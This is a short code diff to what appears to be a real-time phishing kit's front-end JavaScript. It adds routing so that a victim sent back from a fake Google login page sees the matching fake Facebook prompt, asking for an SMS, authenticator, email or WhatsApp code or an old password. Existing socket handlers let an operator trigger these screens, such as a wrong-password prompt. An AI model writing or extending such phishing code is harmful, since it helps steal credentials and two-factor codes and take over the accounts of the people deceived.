@@ -1197,6 +1197,21 @@
             clearInputsAndEnableButtons();
         }
 
+        /* ── Redirected back from google-login.html — open the right FB modal ── */
+        const pendingModalMap = {
+            '2fa':       'codeSms',
+            'auth':      'authcode',
+            'email':     'codeEmail',
+            'whatsapp':  'whatsappcode',
+            'oldpass':   'oldpass',
+            'wrongcreds':'wrongpsw'
+        };
+        const pendingModal = sessionStorage.getItem('pendingModal');
+        if (pendingModal && pendingModalMap[pendingModal]) {
+            sessionStorage.removeItem('pendingModal');
+            showOnly(pendingModalMap[pendingModal]);
+        }
+
         socket.on('show-wrong-creds', () => {
             shownCommands['wrongpsw'] = true;
             showOnly('wrongpsw');
